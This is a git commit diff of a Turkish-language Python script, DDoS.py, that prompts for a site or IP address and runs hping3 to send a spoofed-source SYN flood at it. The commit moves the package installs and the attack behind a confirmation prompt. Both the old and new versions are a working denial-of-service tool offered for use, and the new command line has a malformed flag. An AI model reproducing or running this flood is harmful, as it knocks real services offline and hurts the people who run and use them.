0df510ec63cd71e583f80add7f5af2cf0a4cdfd5
Aser <71518609+ASER-VANT@users.noreply.github.com>
2021-11-10 13:21:12 +0300

    Add files via upload

--- DDoS.py
+++ DDoS.py
@@ -3,19 +3,21 @@
 
 import os
 
-os.system("apt install figlet")
-os.system("apt install hping3")
+
 os.system("clear")
-banner = """\033[94m\033[1m
+sor = input ("\n        UYARI BU ARAÇ ANDROİD TELEFONLARDA ROOT GEREKTİREBİLİR\n\nDevam Etmek İstiyormusun[E/h]  ")
+if sor=="e" or sor=="E":
+	os.system("apt install figlet")
+	os.system("apt install hping3")
+	os.system("clear")
+	banner = """\033[94m\033[1m
 ____  ____   ___  ____  
 |  _ \|  _ \ / _ \/ ___| 
 | | | | | | | | | \___ \ 
 | |_| | |_| | |_| |___) |
 |____/|____/ \___/|____/
-
-"""
-print(banner)
-
-
-sor1 = input("Site Veya IP Adresi Giriniz:  ")
-os.system("hping3 -V -c 100000000 -d 120 -S -w 64 -p 80 --faster --flood --rand-source " + sor1)
+			
+			"""
+	print(banner)
+	sor1 = input("Site Veya IP Adresi Giriniz:  ")
+	os.system("hping3 -S " + sor1 + " -p 80-c 100000000 -d 100  --flood --rand-source ")
